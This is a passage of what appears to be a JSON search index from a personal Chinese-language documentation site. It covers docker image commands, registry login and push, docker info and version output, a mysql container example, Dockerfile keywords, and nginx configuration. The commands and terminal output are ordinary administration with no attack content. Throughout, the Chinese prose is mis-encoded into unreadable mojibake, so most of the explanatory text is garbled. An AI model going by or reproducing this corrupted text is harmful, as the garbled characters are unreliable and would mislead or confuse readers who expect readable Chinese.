åˆ›å»ºé•œåƒçš„è¿‡ç¨‹ä¸ä½¿ç”¨ç¼“å­˜ï¼› --pull å°è¯•å»æ›´æ–°é•œåƒçš„æ–°ç‰ˆæœ¬ï¼› --quiet , -q å®‰é™æ¨¡å¼ï¼ŒæˆåŠŸååªè¾“å‡ºé•œåƒ IDï¼› --rm è®¾ç½®é•œåƒæˆåŠŸååˆ é™¤ä¸­é—´å®¹å™¨ï¼› --shm-size è®¾ç½®/dev/shmçš„å¤§å°ï¼Œé»˜è®¤å€¼æ˜¯64Mï¼› -u limit Ulimité…ç½®ã€‚ --squash å°† Dockerfile ä¸­æ‰€æœ‰çš„æ“ä½œå‹ç¼©ä¸ºä¸€å±‚ã€‚ --tag , -t é•œåƒçš„åå­—åŠæ ‡ç­¾ï¼Œé€šå¸¸ name:tag æˆ–è€… name æ ¼å¼ï¼›å¯ä»¥åœ¨ä¸€æ¬¡æ„å»ºä¸­ä¸ºä¸€ä¸ªé•œåƒè®¾ç½®å¤šä¸ªæ ‡ç­¾ã€‚ --network é»˜è®¤ defaultã€‚åœ¨æ„å»ºæœŸé—´è®¾ç½®RUNæŒ‡ä»¤çš„ç½‘ç»œæ¨¡å¼ ç¤ºä¾‹ ä½¿ç”¨å½“å‰ç›®å½•çš„ Dockerfile åˆ›å»ºé•œåƒï¼Œæ ‡ç­¾ä¸º runoob/ubuntu:v1ã€‚ docker build -t runoob/ubuntu:v1 . ä½¿ç”¨URL github.com/creack/docker-firefox çš„ Dockerfile åˆ›å»ºé•œåƒã€‚ docker build github.com/creack/docker-firefox ä¹Ÿå¯ä»¥é€šè¿‡ -f Dockerfile æ–‡ä»¶çš„ä½ç½®ï¼š $ docker build -f /path/to/a/Dockerfile . åœ¨ Docker å®ˆæŠ¤è¿›ç¨‹æ‰§è¡Œ Dockerfile ä¸­çš„æŒ‡ä»¤å‰ï¼Œé¦–å…ˆä¼šå¯¹ Dockerfile è¿›è¡Œè¯­æ³•æ£€æŸ¥ï¼Œæœ‰è¯­æ³•é”™è¯¯æ—¶ä¼šè¿”å›ï¼š $ docker build -t test/myapp . Sending build context to Docker daemon 2 .048 kB Error response from daemon: Unknown instruction: RUNCMD history docker history : æŸ¥çœ‹æŒ‡å®šé•œåƒçš„åˆ›å»ºå†å² è¯­æ³• docker history [OPTIONS] IMAGE OPTIONSè¯´æ˜ï¼š -H :ä»¥å¯è¯»çš„æ ¼å¼æ‰“å°é•œåƒå¤§å°å’Œæ—¥æœŸï¼Œé»˜è®¤ä¸ºtrueï¼› --no-trunc :æ˜¾ç¤ºå®Œæ•´çš„æäº¤è®°å½•ï¼› -q :ä»…åˆ—å‡ºæäº¤è®°å½•IDã€‚ ç¤ºä¾‹ æŸ¥çœ‹æœ¬åœ°é•œåƒ yanquer/kali:config_apt_list2 çš„åˆ›å»ºå†å² yanque@yanquedembp test % docker history yanquer/kali:config_apt_list2 IMAGE CREATED CREATED BY SIZE COMMENT 24b7cbbe11fb 2 days ago bash 526B kali image with config ustc apt list <missing> 2 days ago bash 96 .3MB <missing> 3 days ago /bin/sh -c #(nop) CMD [\"bash\"] 140MB <missing> 3 days ago /bin/sh -c #(nop) ENV LANG=C.UTF-8 0B <missing> 3 days ago /bin/sh -c #(nop) ADD file:cc482abaa0a3211e9â€¦ 0B <missing> 3 days ago /bin/sh -c #(nop) LABEL org.opencontainers.iâ€¦ 0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE PROJECT_URLâ€¦ 0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE PROJECT_URLâ€¦ 0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE PROJECT_URLâ€¦ 0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE PROJECT_URLâ€¦ 0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE VERSION 0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE 0B yanque@yanquedembp test % save docker save : å°†æŒ‡å®šé•œåƒä¿å­˜æˆ tar å½’æ¡£æ–‡ä»¶ æ³¨è§£ docker export ä¹Ÿå¯ä»¥å¯¼å‡º, ä½†æ˜¯å…¶é’ˆå¯¹çš„æ˜¯å®¹å™¨, saveé’ˆå¯¹çš„æ˜¯é•œåƒ è¯­æ³• docker save [OPTIONS] IMAGE [IMAGE...] OPTIONSè¯´æ˜ï¼š -o :è¾“å‡ºåˆ°çš„æ–‡ä»¶ ç¤ºä¾‹ å°†é•œåƒ yanquer/kali ç”Ÿæˆå½’æ¡£æ–‡ä»¶. yanque@yanquedembp test % docker save -o mykali_image.tar yanquer/kali yanque@yanquedembp test % ls 1 .txt c++ dd mykali-20221228.tar mykali_image.tar yanque@yanquedembp test % ls -lh mykali_image.tar -rw-------@ 1 yanque staff 232M 12 28 16 :47 mykali_image.tar yanque@yanquedembp test % load docker load : å¯¼å…¥ä½¿ç”¨ docker save å‘½ä»¤å¯¼å‡ºçš„é•œåƒ æ³¨è§£ docker export å¯¼å‡ºå½’æ¡£çš„åŠ è½½è§ docker import . è¯­æ³• docker load [OPTIONS] OPTIONSè¯´æ˜ï¼š --input , -i : æŒ‡å®šå¯¼å…¥çš„æ–‡ä»¶ï¼Œä»£æ›¿ STDINã€‚ --quiet , -q : ç²¾ç®€è¾“å‡ºä¿¡æ¯ã€‚ ç¤ºä¾‹ -i çš„æ•ˆæœä¸ < ä¸€æ ·(æ‡‚shellé‡å®šå‘çš„éƒ½çŸ¥é“). å¯¼å…¥ yanquer/kali:config_apt_list2 yanque@yanquedembp test % docker load < mykali_image.tar Loaded image: yanquer/kali:config_apt_list2 yanque@yanquedembp test % yanque@yanquedembp test % docker load --input mykali_image.tar Loaded image: yanquer/kali:config_apt_list2 yanque@yanquedembp test % import docker import : ä»å½’æ¡£æ–‡ä»¶ä¸­åˆ›å»ºé•œåƒ æ³¨è§£ é™¤äº†å¯¼å‡º docker save è¿˜å¯ç”¨äºå¯¼å…¥ docker export å¯¼å‡ºçš„å®¹å™¨å½’æ¡£æ–‡ä»¶. è¯­æ³• docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]] OPTIONSè¯´æ˜ï¼š -c :åº”ç”¨docker æŒ‡ä»¤åˆ›å»ºé•œåƒï¼› -m :æäº¤æ—¶çš„è¯´æ˜æ–‡å­—ï¼› ç¤ºä¾‹ ä» mykali-20221228.tar å½’æ¡£æ–‡ä»¶åˆ›å»º yanquer/mykali é•œåƒ yanque@yanquedembp test % docker import mykali-20221228.tar yanquer/mykali sha256:514ae6d5ab88157b978b729520e30c687a5b1b2e3ff2200de88c827bf5ec5ec8 yanque@yanquedembp test % yanque@yanquedembp test % docker images REPOSITORY TAG IMAGE ID CREATED SIZE yanquer/mykali latest 514ae6d5ab88 6 seconds ago 235MB","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Local-mirror-management.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Local-mirror-management.html"},{"title":"é•œåƒä»“åº“","text":"login/logout docker login : ç™»é™†åˆ°ä¸€ä¸ªDockeré•œåƒä»“åº“ï¼Œå¦‚æœæœªæŒ‡å®šé•œåƒä»“åº“åœ°å€ï¼Œé»˜è®¤ä¸ºå®˜æ–¹ä»“åº“ Docker Hub docker logout : ç™»å‡ºä¸€ä¸ªDockeré•œåƒä»“åº“ï¼Œå¦‚æœæœªæŒ‡å®šé•œåƒä»“åº“åœ°å€ï¼Œé»˜è®¤ä¸ºå®˜æ–¹ä»“åº“ Docker Hub è¯­æ³• docker login [OPTIONS] [SERVER] docker logout [OPTIONS] [SERVER] OPTIONSè¯´æ˜ï¼š -u :ç™»é™†çš„ç”¨æˆ·å -p :ç™»é™†çš„å¯†ç  ç¤ºä¾‹ ç™»é™†åˆ°Docker Hub docker login -u ç”¨æˆ·å -p å¯†ç  ç™»å‡ºDocker Hub docker logout pull docker pull : ä»é•œåƒä»“åº“ä¸­æ‹‰å–æˆ–è€…æ›´æ–°æŒ‡å®šé•œåƒ è¯­æ³• docker pull [OPTIONS] NAME[:TAG|@DIGEST] OPTIONSè¯´æ˜ -a æ‹‰å–æ‰€æœ‰ tagged é•œåƒ --disable-content-trust å¿½ç•¥é•œåƒçš„æ ¡éªŒ,é»˜è®¤å¼€å¯ --platform= <plartform> è·å–æŒ‡å®šå¹³å°é•œåƒ, é»˜è®¤æ‹‰è‡ªå·±å¹³å°çš„, å¦‚ docker pull --platform=arm64 nginx:latest ç¤ºä¾‹ ä»Docker Hubä¸‹è½½javaæœ€æ–°ç‰ˆé•œåƒ: docker pull java ä»Docker Hubä¸‹è½½REPOSITORYä¸ºjavaçš„æ‰€æœ‰é•œåƒ: docker pull -a java æ‹‰å–arm64çš„nginx: docker pull --platform=arm64 nginx push å°†æœ¬åœ°çš„é•œåƒä¸Šä¼ åˆ°é•œåƒä»“åº“,è¦å…ˆç™»é™†åˆ°é•œåƒä»“åº“. è¯­æ³• docker push [OPTIONS] NAME[:TAG] OPTIONSè¯´æ˜ï¼š --disable-content-trust :å¿½ç•¥é•œåƒçš„æ ¡éªŒ,é»˜è®¤å¼€å¯ ç¤ºä¾‹ ä¸Šä¼ æœ¬åœ°é•œåƒ yanquer/kali:config_apt_list2 åˆ°é•œåƒä»“åº“ä¸­ã€‚ ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker push yanquer/kali:config_apt_list2 The push refers to repository [ docker.io/yanquer/kali ] b94b4b255fde: Pushed cca6e5a3dfb7: Pushed 385ea7e36a43: Pushed config_apt_list2: digest: sha256:161c0ffd5197fa4a4a88d00e53ccf43500da3b075f1793d9a3722c6c0bdf15ff size: 948 ( dev_venv ) yanque@yanquedeMacBook-Pro project % æ³¨è§£ docker hub å¯ ç±»æ¯”ä¸ github. æ³¨æ„éœ€è¦å…ˆä½¿ç”¨ docker login ç™»é™†, ä¸”ç›®æ ‡åœ°å€å·²æœ‰ç™»é™†ä»“åº“(æ²¡æœ‰éœ€è¦å…ˆåœ¨ä»“åº“åˆ›å»º). å¦‚è¦éªŒè¯æ˜¯å¦å·²ç™»é™†, å¯ä½¿ç”¨ cat ~/.docker/config.json æŸ¥çœ‹å†…å®¹æ˜¯å¦æœ‰ auths . search docker search : ä»Docker HubæŸ¥æ‰¾é•œåƒ è¯­æ³• docker search [OPTIONS] TERM OPTIONSè¯´æ˜ï¼š --automated :åªåˆ—å‡º automated buildç±»å‹çš„é•œåƒï¼› --no-trunc :æ˜¾ç¤ºå®Œæ•´çš„é•œåƒæè¿°ï¼› -f <è¿‡æ»¤æ¡ä»¶>:åˆ—å‡ºæ”¶è—æ•°ä¸å°äºæŒ‡å®šå€¼çš„é•œåƒã€‚ ç¤ºä¾‹ ä» Docker Hub æŸ¥æ‰¾æ‰€æœ‰é•œåƒååŒ…å« java ï¼Œå¹¶ä¸”æ”¶è—æ•°å¤§äº 10 çš„é•œåƒ yanque@yanquedembp mytest % docker search -f stars = 10 java NAME DESCRIPTION STARS OFFICIAL AUTOMATED node Node.js is a JavaScript-based platform for sâ€¦ 12222 [ OK ] tomcat Apache Tomcat is an open source implementatiâ€¦ 3458 [ OK ] java DEPRECATED ; use \"openjdk\" ( or other JDK implâ€¦ 1976 [ OK ] ghost Ghost is a free and open source blogging plaâ€¦ 1582 [ OK ] couchdb CouchDB is a database that uses JSON for docâ€¦ 500 [ OK ] jetty Jetty provides a Web server and javax.servleâ€¦ 387 [ OK ] amazoncorretto Corretto is a no-cost, production-ready distâ€¦ 267 [ OK ] groovy Apache Groovy is a multi-faceted language foâ€¦ 137 [ OK ] circleci/node Node.js is a JavaScript-based platform for sâ€¦ 130 ibmjava Official IBMÂ® SDK, Javaâ„¢ Technology Edition â€¦ 107 [ OK ] tomee Apache TomEE is an all-Apache Java EE certifâ€¦ 100 [ OK ] ibmcom/ibmjava IBMÂ® SDK, Javaâ„¢ Technology Edition Docker Imâ€¦ 21 bitnami/java Bitnami Java Docker Image 13 [ OK ] å‚æ•°è¯´æ˜ NAME: é•œåƒä»“åº“æºçš„åç§° DESCRIPTION (æè¿°) : é•œåƒçš„æè¿° OFFICIAL: æ˜¯å¦ docker å®˜æ–¹å‘å¸ƒ stars: ç±»ä¼¼ Github é‡Œé¢çš„ starï¼Œè¡¨ç¤ºç‚¹èµã€å–œæ¬¢çš„æ„æ€ã€‚ AUTOMATED: è‡ªåŠ¨æ„å»ºã€‚","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Mirror-warehouse.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Mirror-warehouse.html"},{"title":"info|version","text":"info æ˜¾ç¤º Docker ç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬é•œåƒå’Œå®¹å™¨æ•° è¯­æ³• docker info [OPTIONS] ç¤ºä¾‹ æŸ¥çœ‹dockerç³»ç»Ÿä¿¡æ¯ yanque@yanquedembp ~ % docker info Client: Context: default Debug Mode: false Plugins: buildx: Docker Buildx ( Docker Inc., v0.9.1 ) compose: Docker Compose ( Docker Inc., v2.13.0 ) dev: Docker Dev Environments ( Docker Inc., v0.0.5 ) extension: Manages Docker extensions ( Docker Inc., v0.2.16 ) sbom: View the packaged-based Software Bill Of Materials ( SBOM ) for an image ( Anchore Inc., 0 .6.0 ) scan: Docker Scan ( Docker Inc., v0.22.0 ) Server: Containers: 1 Running: 0 Paused: 0 Stopped: 1 Images: 3 Server Version: 20 .10.21 Storage Driver: overlay2 Backing Filesystem: extfs Supports d_type: true Native Overlay Diff: true userxattr: false Logging Driver: json-file Cgroup Driver: cgroupfs Cgroup Version: 2 Plugins: Volume: local Network: bridge host ipvlan macvlan null overlay Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog Swarm: inactive Runtimes: runc io.containerd.runc.v2 io.containerd.runtime.v1.linux Default Runtime: runc Init Binary: docker-init containerd version: 770bd0108c32f3fb5c73ae1264f7e503fe7b2661 runc version: v1.1.4-0-g5fd4c4d init version: de40ad0 Security Options: seccomp Profile: default cgroupns Kernel Version: 5 .15.49-linuxkit Operating System: Docker Desktop OSType: linux Architecture: x86_64 CPUs: 4 Total Memory: 7 .675GiB Name: docker-desktop ID: OY2O:RZL6:WSMC:6CSU:F2F4:ETDE:JYMM:UYOJ:O3DU:VMV5:NPFN:PA3X Docker Root Dir: /var/lib/docker Debug Mode: false HTTP Proxy: http.docker.internal:3128 HTTPS Proxy: http.docker.internal:3128 No Proxy: hubproxy.docker.internal Registry: https://index.docker.io/v1/ Labels: Experimental: false Insecure Registries: hubproxy.docker.internal:5000 127 .0.0.0/8 Registry Mirrors: https://0b27f0a81a00f3560fbdc00ddd2f99e0.mirror.swr.myhuaweicloud.com/ https://ypzju6vq.mirror.aliyuncs.com/ https://registry.docker-cn.com/ http://hub-mirror.c.163.com/ https://docker.mirrors.ustc.edu.cn/ Live Restore Enabled: false yanque@yanquedembp ~ % version æ˜¾ç¤º Docker ç‰ˆæœ¬ä¿¡æ¯ã€‚ è¯­æ³• docker version [OPTIONS] OPTIONSè¯´æ˜ï¼š -f :æŒ‡å®šè¿”å›å€¼çš„æ¨¡æ¿æ–‡ä»¶ã€‚ ç¤ºä¾‹ æ˜¾ç¤º Docker ç‰ˆæœ¬ä¿¡æ¯ yanque@yanquedembp ~ % docker version Client: Cloud integration: v1.0.29 Version: 20 .10.21 API version: 1 .41 Go version: go1.18.7 Git commit: baeda1f Built: Tue Oct 25 18 :01:18 2022 OS/Arch: darwin/amd64 Context: default Experimental: true Server: Docker Desktop 4 .15.0 ( 93002 ) Engine: Version: 20 .10.21 API version: 1 .41 ( minimum version 1 .12 ) Go version: go1.18.7 Git commit: 3056208 Built: Tue Oct 25 18 :00:19 2022 OS/Arch: linux/amd64 Experimental: false containerd: Version: 1 .6.10 GitCommit: 770bd0108c32f3fb5c73ae1264f7e503fe7b2661 runc: Version: 1 .1.4 GitCommit: v1.1.4-0-g5fd4c4d docker-init: Version: 0 .19.0 GitCommit: de40ad0 yanque@yanquedembp ~ %","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-info_version.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-info_version.html"},{"title":"mysql","text":"hubåœ°å€:: docker-mysql ä¸€äº›ç¯å¢ƒå˜é‡: MYSQL_ROOT_PASSWORD MYSQL_DATABASE MYSQL_USER, MYSQL_PASSWORD MYSQL_ALLOW_EMPTY_PASSWORD MYSQL_RANDOM_ROOT_PASSWORD MYSQL_ONETIME_PASSWORD MYSQL_INITDB_SKIP_TZINFO è¿è¡Œ: docker run --name mymysql -e MYSQL_ROOT_PASSWORD=root -e MYSQL_USER=yanque_wiki -e MYSQL_PASSWORD=yanque_wiki -d mysql:tag","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_store-mysql.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_store-mysql.html"},{"title":"dockerfileç¼–å†™","text":"å®šåˆ¶dockeré•œåƒçš„æ–¹å¼æœ‰ä¸¤ç§ æ‰‹åŠ¨ä¿®æ”¹å®¹å™¨å†…å®¹ï¼Œå¯¼å‡ºæ–°çš„é•œåƒ; ç›¸å…³æŒ‡ä»¤: docker commit å°†å®¹å™¨æäº¤ä¸ºé•œåƒ åŸºäºDockerfileè‡ªè¡Œç¼–å†™æŒ‡ä»¤ï¼ŒåŸºäºæŒ‡ä»¤æµç¨‹åˆ›å»ºé•œåƒ æ³¨è§£ å‰ç½®çŸ¥è¯†: é•œåƒæ˜¯åˆ†å±‚çš„; å®¹å™¨ä»¥é•œåƒä¸ºåŸºç¡€å±‚, æœ¬èº«ä¸ºè¿è¡Œæ—¶å­˜å‚¨å±‚ å…³é”®å­— æ¯ä¸€å¥å…³é”®å­—æŒ‡ä»¤éƒ½ä¼šç”Ÿæˆä¸€ä¸ªé•œåƒå±‚ FROM å¿…é¡» , åŸºäºçš„åŸºç¡€é•œåƒ, æ¯”å¦‚ debian, æ²¡æœ‰åŸºç¡€é•œåƒ, æ²¡æ³•è¿è¡Œä¸Šé¢çš„å±‚ RUN æ‰§è¡Œä»€ä¹ˆæŒ‡ä»¤, æ¯”å¦‚: apt install xxx VOLUME è®¾ç½®å·ï¼ŒæŒ‚è½½ä¸»æœºç›®å½•; å¦‚å»ºç«‹çš„æ•°æ®ç›®å½•, æ¯”å¦‚: # å°† /var/lib/xxx è®¾ç½®ä¸ºæŒ‚è½½å·(mount) VOLUME /var/lib/xxx # å°†å®¹å™¨å†…çš„ /var/lib/xxx æ–‡ä»¶å¤¹ï¼Œåœ¨å®¹å™¨è¿è¡Œæ—¶ï¼Œ # è¯¥ç›®å½•è‡ªåŠ¨æŒ‚è½½ä¸ºåŒ¿åå·ï¼Œä»»ä½•å‘è¯¥ç›®å½•ä¸­å†™å…¥æ•°æ®çš„æ“ä½œï¼Œ # éƒ½ä¸ä¼šè¢«å®¹å™¨è®°å½•ï¼Œä¿è¯çš„å®¹å™¨å­˜å‚¨å±‚æ— çŠ¶æ€ç†å¿µ å¦‚æœæœ‰å¤šä¸ª: VOLUME [\"/var/lib/xxx\", \"/var/lib/xxx2\", \"/var/lib/xxx3\", ...] å®¹å™¨åœ¨è¿è¡Œæ—¶ï¼Œåº”è¯¥ä¿è¯åœ¨å­˜å‚¨å±‚ä¸å†™å…¥ä»»ä½•æ•°æ®ï¼Œè¿è¡Œåœ¨å®¹å™¨å†…äº§ç”Ÿçš„æ•°æ®ï¼Œ æ¨èæ˜¯ æŒ‚è½½ï¼Œå†™å…¥åˆ°å®¿ä¸»æœºä¸Šï¼Œè¿›è¡Œç»´æŠ¤ã€‚ å¦‚æœrunçš„æ—¶å€™æ²¡æœ‰-væ‰‹åŠ¨æŒ‡å®šæŒ‚è½½, æŒ‡å®šçš„å†…å®¹ä¼šè‡ªåŠ¨æŒ‚è½½åˆ°å®¿ä¸»æœº, å¯ä»¥ä½¿ç”¨: docker inspect $container_name æ£€æŸ¥æŒ‚è½½çš„ä½ç½® MAINTAINER æŒ‡å®šç»´æŠ¤è€…ä¿¡æ¯ï¼Œå¯ä»¥æ²¡æœ‰ ADD COPYå®¿ä¸»æœºçš„æ–‡ä»¶åˆ°å®¹å™¨å†…, ä¼šè‡ªåŠ¨è§£å‹ è¿˜æ”¯æŒ URL ä¸‹è½½é“¾æ¥, æƒé™é»˜è®¤600, ä½†æ˜¯è¿™æ—¶ä¸ä¼šè§£å‹(å¦‚æœæ˜¯å‹ç¼©åŒ…) å®˜æ–¹æ›´æ¨èCOPY, å› ä¸ºADDåŒ…å«äº†æ›´å¤šå¤æ‚çš„åŠŸèƒ½ï¼Œä¸”ADDä¼šä½¿æ„å»ºç¼“å­˜å¤±æ•ˆï¼Œå¯¼è‡´é•œåƒæ„å»ºç¼“æ…¢ WORKDIR è®¾ç½®å½“å‰å·¥ä½œç›®å½• USER è®¾ç½®å½“å‰ç”¨æˆ· EXPOSE æŒ‡å®šå®¹å™¨è¿è¡Œæ—¶å¯¹å¤–æä¾›çš„ç«¯å£æœåŠ¡ï¼Œ å¸®åŠ©ä½¿ç”¨è¯¥é•œåƒçš„äººï¼Œå¿«é€Ÿç†è§£è¯¥å®¹å™¨çš„ä¸€ä¸ªç«¯å£ä¸šåŠ¡ ç›¸å…³æŒ‡ä»¤: docker port å®¹å™¨ # æŸ¥çœ‹å·²ç»æ˜ å°„çš„ç«¯å£ docker run -p å®¿ä¸»æœºç«¯å£ï¼šå®¹å™¨ç«¯å£ docker run -P # ä½œç”¨æ˜¯éšæœºå®¿ä¸»æœºç«¯å£ï¼šå®¹å™¨å†…ç«¯å£ CMD æŒ‡å®šå®¹å™¨å¯åŠ¨åçš„è¦å¹²çš„äº‹æƒ…, è¯­æ³•: CMD [\"å‚æ•°1\", \"å‚æ•°2\"] ä¸ç›´æ¥åœ¨docker run æœ€åå†™commandæ•ˆæœä¸€è‡´. å³è¯¥é•œåƒåœ¨è¿è¡Œå®¹å™¨å®ä¾‹çš„æ—¶å€™ï¼Œæ‰§è¡Œçš„å…·ä½“å‚æ•°æ˜¯ä»€ä¹ˆ, å¦‚: docker run -it debian bash # æ³¨æ„è¿™é‡Œçš„ä¼˜å…ˆçº§é«˜äºCMDçš„, ä¹Ÿå°±æ˜¯å¦‚æœæŒ‡å®šäº†ä¼šè¦†ç›–CMDçš„ å®šä¹‰ # å°±ç›¸å½“äºdockerfileçš„ CMD [\"bash\"] è²Œä¼¼å¾ˆå¤šé»˜è®¤è¡Œä¸ºå°±æ˜¯: CMD [\"/bin/bash\"] å¦‚æœæ˜¯å¤šä¸ªè¦åˆ†å¼€: CMD [\"cat\", \"/etc/debian_version\"] å¦‚æœæŒ‡å®šäº† ENTRYPOINT, CMDæŒ‡å®šå…·ä½“çš„å‚æ•°å°±æ˜¯ä¼ ç»™ ENTRYPOINT ENV è®¾ç½®ç¯å¢ƒå˜é‡; æ¯”å¦‚: ENV a 1 COPY COPYå®¿ä¸»æœºçš„æ–‡ä»¶åˆ°å®¹å™¨å†…, ä¸ä¼šè‡ªåŠ¨è§£å‹ ENTRYPOINT å®¹å™¨å¯åŠ¨åæ‰§è¡Œçš„å‘½ä»¤. ä½œç”¨å’ŒCMDä¸€æ · å½“æŒ‡å®šäº† ENTRYPOINT, CMDæŒ‡å®šå…·ä½“çš„å‚æ•°å°±æ˜¯ä¼ ç»™ ENTRYPOINT ARG è®¾ç½®ç¯å¢ƒå˜é‡, è¿™ç‚¹ä¸ENVä¸€è‡´; åŒºåˆ«åœ¨äº: ENV æ— è®ºæ˜¯åœ¨é•œåƒæ„å»ºæ—¶ï¼Œè¿˜æ˜¯å®¹å™¨è¿è¡Œï¼Œè¯¥å˜é‡éƒ½å¯ä»¥ä½¿ç”¨; ARGåªæ˜¯ç”¨äºæ„å»ºé•œåƒéœ€è¦è®¾ç½®çš„å˜é‡ï¼Œå®¹å™¨è¿è¡Œæ—¶å°±æ¶ˆå¤±äº† åˆ›å»º æ³¨è§£ åˆ›å»ºçš„æ–‡ä»¶åå¿…é¡»æ—¶ Dockerfile / dockerfile å†™å¥½åæ„å»ºå‡ºé•œåƒ: docker build . ç»å…¸é—®é¢˜: CMD systemctl start nginx è¿™æ ·çš„å†™æ³•æ˜¯é”™è¯¯çš„ï¼Œå®¹å™¨ä¼šç«‹å³é€€å‡º å› ä¸ºsystemct1 start nginxæ˜¯å¸Œæœ›ä»¥å®ˆæŠ¤è¿›ç¨‹å½¢å¼å¯åŠ¨nginxï¼Œä¸”CMDå‘½ä»¤ä¼šè½¬åŒ–ä¸º CMD [\"sh\"ï¼Œ\"-C\"ï¼Œ \"systemctl start nginx\"] è¿™æ ·çš„å‘½ä»¤ä¸»è¿›ç¨‹æ˜¯shè§£é‡Šå™¨ï¼Œæ‰§è¡Œå®Œæ¯•åç«‹å³ç»“æŸäº†ï¼Œå› æ­¤å®¹å™¨ä¹Ÿå°±é€€å‡ºäº†ã€‚ å› æ­¤æ­£ç¡®çš„åšæ³•åº”è¯¥æ˜¯CMD [\"nginx\"ï¼Œ\"-g\"ï¼Œ\"daemon offï¼›\"]","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-dockerfile-writing.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-dockerfile-writing.html"},{"title":"ä¸å…¶ä»–äº§å“å¯¹æ¯”","text":"ä»€ä¹ˆæƒ…å†µä¸‹ç”¨nginx? å¤§æµé‡, æ€§èƒ½ ä¸Apacheå¯¹æ¯” ä»€ä¹ˆæƒ…å†µä¸‹ä½¿ç”¨ Apache httpd ? é«˜å¹¶å‘ é™ä½è¯·æ±‚çš„åˆ‡æ¢æˆæœ¬ é™ä½å•è¯·æ±‚çš„å†…å­˜å ç”¨ å¯¹é«˜é¢‘æ“ä½œä»¥ç©ºé—´æ¢æ—¶é—´ Webå®¹å™¨ åŒæ­¥æ–¹å¼ é˜»å¡æ–¹å¼","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-nginx-Compared-with-other-products.html","loc":"/yq-doc-source-docs-Container-and-cluster-nginx-Compared-with-other-products.html"},{"title":"nginxé…ç½®ç®¡ç†","text":"å‚è€ƒ: Nginx web serveré…ç½® ç®¡ç† Nginx è¿›ç¨‹ æ³¨è§£ å…³äº Master å’Œ Worker è¿›ç¨‹, è§ NginxMasterAndWorker æœ‰ä¸¤ç§æ–¹å¼è®©ä¿®æ”¹åçš„é…ç½®æ–‡ä»¶ç”Ÿæ•ˆï¼š åœæ­¢ å¹¶ é‡å¯ Nginx ç»™`master`è¿›ç¨‹å‘é€ä¿¡å· ä¿¡å·å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å‘é€(nginxæ˜¯å¯æ‰§è¡Œæ–‡ä»¶): nginx -s signal å…¶ä¸­ signal å¸¸ç”¨é€‰é¡¹å¦‚ä¸‹ quit - ä¼˜é›…çš„å…³é—­ï¼Œå³å¤„ç†å®Œå½“å‰è¯·æ±‚å†å…³é—­ reload - é‡æ–°è½½å…¥é…ç½®æ–‡ä»¶ reopen - é‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶ stop - ç«‹å³å…³é—­ ä¹Ÿå¯ä»¥é€šè¿‡Linuxçš„`kill`å‘½ä»¤ç›´æ¥å‘é€ä¿¡å·ç»™`master`è¿›ç¨‹ã€‚Nginxçš„è¿›ç¨‹IDé€šå¸¸ä¿å­˜åœ¨`/usr/local/nginx/logs`æˆ–`/var/run`ç›®å½•ä¸‹çš„`nginx.pid`æ–‡ä»¶ä¸­ã€‚ ä½¿ç”¨å˜é‡ é€šè¿‡åœ¨é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨å˜é‡ï¼Œå¯ä»¥è®©Nginxä»¥ä¸åŒçš„æ–¹å¼å¤„ç†è¯·æ±‚ã€‚ å˜é‡çš„å€¼åœ¨è¿è¡Œæ—¶è®¡ç®—è·å¾—ï¼Œå¹¶å¯ä½œä¸ºå‚æ•°ä¼ é€’ç»™æŒ‡ä»¤ã€‚ å˜é‡å¿…é¡»ä»¥`$`å¼€å¤´ã€‚å˜é‡åŸºäºNginxçš„çŠ¶æ€å®šä¹‰ä¿¡æ¯ï¼Œå¦‚æ­£è¢«å¤„ç†è¯·æ±‚çš„å±æ€§ã€‚ NginxåŒ…å«è®¸å¤šé¢„è®¾çš„å˜é‡ï¼Œå¦‚`core HTTP`å˜é‡é›†ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨`set`ã€ map`å’Œ`geo`æŒ‡ä»¤æ¥è‡ªå®šä¹‰å˜é‡ã€‚ å¤§å¤šæ•°å˜é‡éƒ½åœ¨è¿è¡Œæ—¶è®¡ç®—å€¼ï¼Œè¿™äº›å€¼ä¸€èˆ¬éƒ½åŒ…å«æŸä¸ªè¯·æ±‚çš„ç›¸å…³ä¿¡æ¯ã€‚ å¦‚`$remote_addr`åŒ…å«äº†IPåœ°å€ï¼Œè€Œ`uri`åˆ™åŒ…å«äº†å½“å‰è®¿é—®çš„`URI ã€‚ å†…ç½®å…¨å±€å˜é‡ å˜é‡: $args ï¼šè¿™ä¸ªå˜é‡ç­‰äºè¯·æ±‚è¡Œä¸­çš„å‚æ•°ï¼ŒåŒ$query_string $content_length ï¼š è¯·æ±‚å¤´ä¸­çš„Content-lengthå­—æ®µã€‚ $content_type ï¼š è¯·æ±‚å¤´ä¸­çš„Content-Typeå­—æ®µã€‚ $document_root ï¼š å½“å‰è¯·æ±‚åœ¨rootæŒ‡ä»¤ä¸­æŒ‡å®šçš„å€¼ã€‚ 